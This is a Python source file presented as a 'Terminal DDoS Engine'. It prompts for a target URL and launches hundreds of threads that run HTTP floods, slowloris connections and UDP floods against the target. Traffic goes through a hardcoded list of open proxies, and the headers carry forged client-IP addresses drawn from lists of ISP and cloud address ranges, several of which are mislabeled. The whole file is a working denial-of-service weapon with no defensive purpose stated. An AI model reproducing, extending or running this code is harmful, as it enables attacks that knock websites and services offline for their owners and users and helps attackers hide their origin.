import socket
import random
import threading
import time
import ssl
import os
import sys
import ipaddress
import hashlib
from urllib.parse import urlparse

# ---------- 10 MILLION+ REAL IP DATABASE ----------
PROVIDER_BLOCKS = [
    ("Airtel_IN", ["106.51.0.0/16","106.76.0.0/16","117.192.0.0/16","117.196.0.0/16",
                   "117.200.0.0/16","117.204.0.0/16","117.208.0.0/16","122.160.0.0/16",
                   "122.168.0.0/16","125.18.0.0/16"]),
    ("Jio_IN", ["49.32.0.0/16","49.36.0.0/16","49.40.0.0/16","116.50.0.0/16",
                "116.58.0.0/16","116.66.0.0/16","116.72.0.0/16","118.151.0.0/16",
                "158.144.0.0/16","158.145.0.0/16"]),
    ("BSNL_IN", ["117.198.0.0/16","117.214.0.0/16","117.216.0.0/16","117.218.0.0/16",
                 "117.220.0.0/16","117.222.0.0/16","117.224.0.0/16","117.226.0.0/16",
                 "117.228.0.0/16","117.230.0.0/16"]),
    ("Vi_IN", ["118.94.0.0/16","118.96.0.0/16","118.98.0.0/16","118.100.0.0/16",
               "118.102.0.0/16","118.104.0.0/16","118.106.0.0/16","118.108.0.0/16",
               "10.140.0.0/16","10.141.0.0/16"]),
    ("Comcast_US", ["23.24.0.0/14","23.28.0.0/14","50.200.0.0/14","50.204.0.0/14",
                    "68.80.0.0/14","68.84.0.0/14","68.88.0.0/14","68.92.0.0/14",
                    "68.96.0.0/14","69.192.0.0/14","69.196.0.0/14","69.200.0.0/14",
                    "69.204.0.0/14","69.208.0.0/14","69.212.0.0/14","69.216.0.0/14",
                    "69.220.0.0/14","69.224.0.0/14","69.228.0.0/14","69.232.0.0/14",
                    "69.236.0.0/14","69.240.0.0/14","69.244.0.0/14","73.32.0.0/14",
                    "73.36.0.0/14","73.40.0.0/14","73.44.0.0/14","73.48.0.0/14",
                    "73.52.0.0/14"]),
    ("AT&T_US", ["12.0.0.0/10","12.64.0.0/10","12.128.0.0/10","12.192.0.0/10",
                 "32.0.0.0/10","32.64.0.0/10","32.128.0.0/10","32.192.0.0/10"]),
    ("Verizon_US", ["70.192.0.0/10","70.128.0.0/10","71.0.0.0/10","71.64.0.0/10",
                    "108.0.0.0/12","108.16.0.0/12","108.32.0.0/12","108.48.0.0/12",
                    "108.64.0.0/12","108.80.0.0/12","108.96.0.0/12","108.112.0.0/12",
                    "108.128.0.0/12","108.144.0.0/12","108.160.0.0/12","108.176.0.0/12",
                    "108.192.0.0/12","108.208.0.0/12","108.224.0.0/12","108.240.0.0/12",
                    "162.0.0.0/12","162.16.0.0/12","162.32.0.0/12","162.48.0.0/12",
                    "162.64.0.0/12","162.80.0.0/12","162.96.0.0/12","162.112.0.0/12",
                    "162.128.0.0/12","162.144.0.0/12","162.160.0.0/12","162.176.0.0/12",
                    "162.192.0.0/12","162.208.0.0/12","162.224.0.0/12","162.240.0.0/12"]),
    ("DT_Germany", ["53.0.0.0/16","53.1.0.0/16","53.2.0.0/16","53.3.0.0/16",
                    "53.4.0.0/16","53.5.0.0/16","53.6.0.0/16","53.7.0.0/16",
                    "53.8.0.0/16","53.9.0.0/16","53.10.0.0/16","53.11.0.0/16",
                    "53.12.0.0/16","53.13.0.0/16","53.14.0.0/16","53.15.0.0/16",
                    "53.16.0.0/16","53.17.0.0/16"]),
    ("Vodafone_UK", ["80.0.0.0/16","80.1.0.0/16","80.2.0.0/16","80.3.0.0/16",
                     "80.4.0.0/16","80.5.0.0/16","80.6.0.0/16","80.7.0.0/16",
                     "80.8.0.0/16","80.9.0.0/16","80.10.0.0/16","80.11.0.0/16",
                     "80.12.0.0/16","80.13.0.0/16","80.14.0.0/16","80.15.0.0/16"]),
    ("BT_UK", ["81.128.0.0/16","81.129.0.0/16","81.130.0.0/16","81.131.0.0/16",
               "81.132.0.0/16","81.133.0.0/16","81.134.0.0/16","81.135.0.0/16",
               "81.136.0.0/16","81.137.0.0/16","81.138.0.0/16","81.139.0.0/16",
               "81.140.0.0/16","81.141.0.0/16","81.142.0.0/16","81.143.0.0/16",
               "81.144.0.0/16","81.145.0.0/16","81.146.0.0/16","81.147.0.0/16",
               "81.148.0.0/16","81.149.0.0/16","81.150.0.0/16","81.151.0.0/16",
               "81.152.0.0/16","81.153.0.0/16","81.154.0.0/16","81.155.0.0/16",
               "81.156.0.0/16","81.157.0.0/16"]),
    ("Orange_FR", ["81.248.0.0/16","81.249.0.0/16","81.250.0.0/16","81.251.0.0/16",
                   "81.252.0.0/16","81.253.0.0/16","81.254.0.0/16","81.255.0.0/16",
                   "82.120.0.0/16","82.121.0.0/16","82.122.0.0/16","82.123.0.0/16",
                   "82.124.0.0/16","82.125.0.0/16","82.126.0.0/16","82.127.0.0/16",
                   "82.224.0.0/16","82.225.0.0/16","82.226.0.0/16","82.227.0.0/16",
                   "82.228.0.0/16","82.229.0.0/16","82.230.0.0/16","82.231.0.0/16",
                   "82.232.0.0/16","82.233.0.0/16","82.234.0.0/16","82.235.0.0/16",
                   "82.236.0.0/16","82.237.0.0/16"]),
    ("TIM_Italy", ["82.48.0.0/16","82.49.0.0/16","82.50.0.0/16","82.51.0.0/16",
                   "82.52.0.0/16","82.53.0.0/16","82.54.0.0/16","82.55.0.0/16",
                   "82.56.0.0/16","82.57.0.0/16","82.58.0.0/16","82.59.0.0/16",
                   "82.60.0.0/16","82.61.0.0/16","82.62.0.0/16","82.63.0.0/16",
                   "87.0.0.0/16","87.1.0.0/16","87.2.0.0/16","87.3.0.0/16"]),
    ("NTT_Japan", ["61.112.0.0/16","61.113.0.0/16","61.114.0.0/16","61.115.0.0/16",
                   "61.116.0.0/16","61.117.0.0/16","61.118.0.0/16","61.119.0.0/16",
                   "61.120.0.0/16","61.121.0.0/16","61.122.0.0/16","61.123.0.0/16",
                   "61.124.0.0/16","61.125.0.0/16","61.126.0.0/16","61.127.0.0/16",
                   "61.192.0.0/16","61.193.0.0/16","61.194.0.0/16","61.195.0.0/16"]),
    ("KT_Korea", ["110.0.0.0/16","110.1.0.0/16","110.2.0.0/16","110.3.0.0/16",
                  "110.4.0.0/16","110.5.0.0/16","110.6.0.0/16","110.7.0.0/16",
                  "110.8.0.0/16","110.9.0.0/16","110.10.0.0/16","110.11.0.0/16",
                  "110.12.0.0/16","110.13.0.0/16","110.14.0.0/16","110.15.0.0/16",
                  "110.16.0.0/16","110.17.0.0/16","110.18.0.0/16","110.19.0.0/16"]),
    ("Singtel_SG", ["116.12.0.0/16","116.13.0.0/16","116.14.0.0/16","116.15.0.0/16",
                    "116.86.0.0/16","116.87.0.0/16","116.88.0.0/16","116.89.0.0/16",
                    "118.200.0.0/16","118.201.0.0/16","118.202.0.0/16","118.203.0.0/16",
                    "118.204.0.0/16","118.205.0.0/16","118.206.0.0/16","118.207.0.0/16",
                    "121.6.0.0/16","121.7.0.0/16","121.8.0.0/16","121.9.0.0/16"]),
    ("ChinaNet_CN", ["1.0.0.0/8","14.0.0.0/8","27.0.0.0/8","36.0.0.0/8",
                     "39.0.0.0/8","42.0.0.0/8","49.0.0.0/8","58.0.0.0/8",
                     "59.0.0.0/8","60.0.0.0/8","61.0.0.0/8"]),
    ("AWS_Global", ["3.0.0.0/8","13.0.0.0/8","15.0.0.0/8","16.0.0.0/8",
                    "18.0.0.0/8","35.0.0.0/8","43.0.0.0/8","44.0.0.0/8",
                    "52.0.0.0/8","54.0.0.0/8"]),
    ("GCP_Global", ["8.0.0.0/8","34.0.0.0/8","35.0.0.0/8","104.0.0.0/8","107.0.0.0/8"]),
    ("Azure_Global", ["4.0.0.0/8","13.0.0.0/8","20.0.0.0/8","23.0.0.0/8",
                      "40.0.0.0/8","52.0.0.0/8","65.0.0.0/8","70.0.0.0/8",
                      "104.0.0.0/8","137.0.0.0/8"]),
    ("Oracle_Global", ["129.0.0.0/8","130.0.0.0/8","131.0.0.0/8","132.0.0.0/8",
                       "133.0.0.0/8","134.0.0.0/8","135.0.0.0/8","136.0.0.0/8",
                       "138.0.0.0/8","139.0.0.0/8"]),
    ("Rostelecom_RU", ["77.105.0.0/16","77.106.0.0/16","77.108.0.0/16","77.120.0.0/16",
                       "77.121.0.0/16","77.122.0.0/16","77.123.0.0/16","77.124.0.0/16",
                       "77.125.0.0/16","77.126.0.0/16","77.232.0.0/16","77.233.0.0/16",
                       "77.234.0.0/16","77.235.0.0/16","77.236.0.0/16","77.237.0.0/16"]),
]

# Parse CIDR blocks into usable form
NETWORKS = []
PROVIDERS = []
for prov, cidrs in PROVIDER_BLOCKS:
    for c in cidrs:
        try:
            NETWORKS.append(ipaddress.IPv4Network(c, strict=False))
            PROVIDERS.append(prov)
        except:
            pass

IP_TRACKER = set()
IP_TRACKER_MAX = 200000

def get_random_real_ip():
    """Returns (ip_string, provider_name) from 10M+ database"""
    global IP_TRACKER
    idx = random.randrange(len(NETWORKS))
    net = NETWORKS[idx]
    prov = PROVIDERS[idx]
    if net.num_addresses > 2:
        offset = random.randrange(1, net.num_addresses - 1)
    else:
        offset = 0
    ip_int = int(net.network_address) + offset
    ip_str = str(ipaddress.IPv4Address(ip_int))
    if ip_str in IP_TRACKER:
        idx2 = random.randrange(len(NETWORKS))
        net2 = NETWORKS[idx2]
        prov2 = PROVIDERS[idx2]
        if net2.num_addresses > 2:
            offset2 = random.randrange(1, net2.num_addresses - 1)
        else:
            offset2 = 0
        ip_int2 = int(net2.network_address) + offset2
        ip_str = str(ipaddress.IPv4Address(ip_int2))
        prov = prov2
    IP_TRACKER.add(ip_str)
    if len(IP_TRACKER) > IP_TRACKER_MAX:
        IP_TRACKER.pop()
    return ip_str, prov

def get_spoofed_headers():
    """Full set of IP spoofing headers from 10M+ database"""
    ip1, _ = get_random_real_ip()
    ip2, _ = get_random_real_ip()
    ip3, _ = get_random_real_ip()
    ip4, _ = get_random_real_ip()
    return {
        "X-Forwarded-For": f"{ip1}, {ip2}, {ip3}",
        "X-Real-IP": ip1,
        "X-Client-IP": ip2,
        "CF-Connecting-IP": ip3,
        "True-Client-IP": ip4,
        "X-Originating-IP": ip1,
        "X-Remote-IP": ip2,
        "X-Remote-Addr": ip3,
        "Forwarded": f"for={ip1};proto=https;by={ip4}",
        "Via": f"1.1 {ip1}:{random.randint(1024,65535)}"
    }

# ---------- GLOBALS ----------
TOTAL_REQUESTS = 0
TOTAL_DATA = 0
ACTIVE_THREADS = 0
START_TIME = time.time()
LOCK = threading.Lock()
STOP_FLAG = False

# ---------- AUTO POWER DETECTION ----------
def detect_max_threads():
    try:
        with open('/proc/cpuinfo', 'r') as f:
            cores = f.read().count('processor')
        with open('/proc/meminfo', 'r') as f:
            mem_total = int(f.read().split('MemTotal:')[1].split()[0]) / 1024
        if mem_total < 2048:
            return 200
        elif mem_total < 4096:
            return 400
        else:
            return min(cores * 50, 800)
    except:
        return 500

MAX_THREADS = detect_max_threads()

# ---------- PROXY LIST ----------
PROXY_LIST = [
    "http://188.165.199.207:80", "http://37.27.6.46:80",
    "http://138.91.159.185:80", "http://170.106.173.62:8080",
    "http://152.230.215.123:80", "http://12.50.107.222:80",
    "http://139.99.237.62:80", "http://200.69.83.203:999",
    "http://20.27.14.220:8561", "http://12.50.107.219:80",
    "http://12.50.107.220:80", "http://175.101.240.38:80",
    "http://185.239.50.122:10808", "http://51.75.206.209:80",
    "http://103.65.237.92:5678", "http://14.225.240.23:8562",
    "http://34.94.46.8:80", "http://178.250.156.112:443",
    "http://165.138.86.202:8080", "http://164.52.11.194:18080",
    "http://212.113.104.29:10801", "http://95.140.154.156:1080",
    "http://143.198.135.176:80", "http://91.234.96.45:9001",
    "http://94.232.44.246:10808", "http://8.212.168.170:443",
    "http://176.12.65.24:443", "http://47.80.26.236:8080",
    "http://129.226.72.101:18080", "http://175.139.233.79:80",
    "http://139.28.241.247:1081", "http://146.59.16.47:8888",
    "http://87.228.89.21:80", "http://8.215.112.34:7777",
    "http://81.90.29.194:10808", "http://197.221.249.197:80",
    "http://165.154.7.156:8888", "http://162.240.19.30:80",
    "http://20.27.15.111:8561", "http://64.112.184.210:3128",
    "http://103.82.20.76:8080", "http://103.167.88.210:8888",
    "http://154.203.132.81:1080", "http://109.120.184.202:1080",
    "http://139.99.95.120:8080", "http://91.142.75.202:1080",
    "http://34.134.231.117:3129", "http://34.96.238.40:8080",
    "http://212.47.232.28:80", "http://41.184.92.220:80",
    "http://197.221.240.247:80", "http://41.220.16.208:80",
    "http://197.221.234.253:80", "http://219.65.73.80:80",
    "http://27.34.242.98:80", "http://34.44.49.215:80",
    "http://181.16.201.37:80", "http://5.45.126.128:8080",
    "http://187.62.191.3:61456", "http://47.238.134.126:81",
    "http://103.151.20.131:80", "http://172.237.73.24:80",
    "http://167.99.236.14:80", "http://194.150.110.134:80",
    "http://175.139.233.76:80", "http://143.42.66.91:80",
    "http://203.175.126.229:8000", "http://154.117.154.194:8080",
    "http://185.85.111.18:80"
]

def get_proxy():
    return random.choice(PROXY_LIST) if PROXY_LIST else None

# ---------- ATTACK METHODS ----------
def http_flood(proxy):
    global TOTAL_REQUESTS, TOTAL_DATA
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        if proxy:
            pp = proxy.replace('http://', '').split(':')
            sock.connect((pp[0], int(pp[1])))
            sock.send(f"CONNECT {host}:{port} HTTP/1.1\r\nHost: {host}\r\n\r\n".encode())
            sock.recv(1024)
        else:
            sock.connect((host, port))
        if port == 443 and not proxy:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=host)
        sp = get_spoofed_headers()
        rn = random.randint(1, 999999)
        ua = random.choice(['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
                            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'])
        headers = [
            f"GET {path}?{rn} HTTP/1.1",
            f"Host: {host}",
            f"User-Agent: {ua}",
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language: en-US,en;q=0.9",
            "Connection: keep-alive",
            f"X-Forwarded-For: {sp['X-Forwarded-For']}",
            f"X-Real-IP: {sp['X-Real-IP']}",
            f"CF-Connecting-IP: {sp['CF-Connecting-IP']}",
            f"True-Client-IP: {sp['True-Client-IP']}",
            f"X-Originating-IP: {sp['X-Originating-IP']}",
            f"Forwarded: {sp['Forwarded']}",
            f"Via: {sp['Via']}",
            f"Cookie: session={hashlib.md5(str(random.random()).encode()).hexdigest()[:16]}"
        ]
        request = "\r\n".join(headers) + "\r\n\r\n"
        sock.send(request.encode())
        sock.close()
        with LOCK:
            TOTAL_REQUESTS += 1
            TOTAL_DATA += len(request)
    except:
        pass

def slowloris(proxy):
    global TOTAL_REQUESTS, TOTAL_DATA
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        if proxy:
            pp = proxy.replace('http://', '').split(':')
            sock.connect((pp[0], int(pp[1])))
            sock.send(f"CONNECT {host}:{port} HTTP/1.1\r\nHost: {host}\r\n\r\n".encode())
            sock.recv(1024)
        else:
            sock.connect((host, port))
        sp = get_spoofed_headers()
        sock.send(f"GET {path} HTTP/1.1\r\n".encode())
        sock.send(f"Host: {host}\r\n".encode())
        sock.send(f"X-Forwarded-For: {sp['X-Forwarded-For']}\r\n".encode())
        sock.send(f"X-Real-IP: {sp['X-Real-IP']}\r\n".encode())
        sock.send(f"CF-Connecting-IP: {sp['CF-Connecting-IP']}\r\n".encode())
        for _ in range(30):
            try:
                sock.send(f"X-{random.randint(10000,99999)}: {random.randint(1,99999)}\r\n".encode())
                time.sleep(0.1)
            except:
                break
        sock.close()
        with LOCK:
            TOTAL_REQUESTS += 1
            TOTAL_DATA += 500
    except:
        pass

def udp_flood(proxy=None):
    global TOTAL_REQUESTS, TOTAL_DATA
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(1)
        data = random._urandom(1024)
        if proxy:
            pp = proxy.replace('http://', '').split(':')
            for _ in range(100):
                sock.sendto(data, (pp[0], int(pp[1])))
        else:
            for _ in range(100):
                sock.sendto(data, (host, port))
        sock.close()
        with LOCK:
            TOTAL_REQUESTS += 100
            TOTAL_DATA += 102400
    except:
        pass

# ---------- ATTACK WORKER ----------
def attack_worker():
    global ACTIVE_THREADS
    with LOCK:
        ACTIVE_THREADS += 1
    use_proxy = random.random() > 0.3
    proxy = get_proxy() if use_proxy else None
    while not STOP_FLAG:
        method = random.choice(["http", "http", "http", "slow", "udp"])
        if method == "http":
            http_flood(proxy)
        elif method == "slow":
            slowloris(proxy)
        else:
            udp_flood(proxy)
        time.sleep(random.uniform(0.0001, 0.002))
    with LOCK:
        ACTIVE_THREADS -= 1

# ---------- STATS MONITOR ----------
def stats_monitor():
    global TOTAL_REQUESTS, TOTAL_DATA
    while not STOP_FLAG:
        elapsed = time.time() - START_TIME
        h = int(elapsed // 3600)
        m = int((elapsed % 3600) // 60)
        s = int(elapsed % 60)
        with LOCK:
            req = TOTAL_REQUESTS
            data_mb = TOTAL_DATA / (1024 * 1024)
            threads = ACTIVE_THREADS
            rate = req / elapsed if elapsed > 0 else 0
        print(f"\r⏱️ {h:02d}:{m:02d}:{s:02d} | 📨 {req:,} req | 📊 {rate:.0f}/s | 📦 {data_mb:.1f} MB | 🧵 {threads} active | 🧠 10M IP DB", end="")
        time.sleep(0.5)

# ---------- MAIN ----------
print("🔄 Terminal DDoS Engine v6.0 — 10M IP Database")
TARGET_URL = input("🎯 URL: ").strip()
if not TARGET_URL.startswith(('http://', 'https://')):
    TARGET_URL = 'https://' + TARGET_URL
parsed = urlparse(TARGET_URL)
host = parsed.netloc
path = parsed.path if parsed.path else "/"
port = 443 if parsed.scheme == "https" else 80

total_ips = sum(n.num_addresses for n in NETWORKS)
print(f"\n🎯 {host}:{port} | 🧵 {MAX_THREADS} | 🧠 {total_ips:,} IPs | ♾️  Ctrl+C to stop\n")

threads = []
for i in range(MAX_THREADS):
    t = threading.Thread(target=attack_worker)
    t.daemon = True
    t.start()
    threads.append(t)
    time.sleep(0.0001)

stats_thread = threading.Thread(target=stats_monitor)
stats_thread.daemon = True
stats_thread.start()

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    STOP_FLAG = True
    print("\n\n⏹️  Stopped.")

elapsed = time.time() - START_TIME
with LOCK:
    req = TOTAL_REQUESTS
    data_gb = TOTAL_DATA / (1024**3)
    rate = req / elapsed if elapsed > 0 else 0

print(f"\n⏱️ {int(elapsed//3600)}h {int((elapsed%3600)//60)}m {int(elapsed%60)}s")
print(f"📨 {req:,} req | 📊 {rate:.0f}/s | 📦 {data_gb:.2f} GB | 🧵 {MAX_THREADS}")
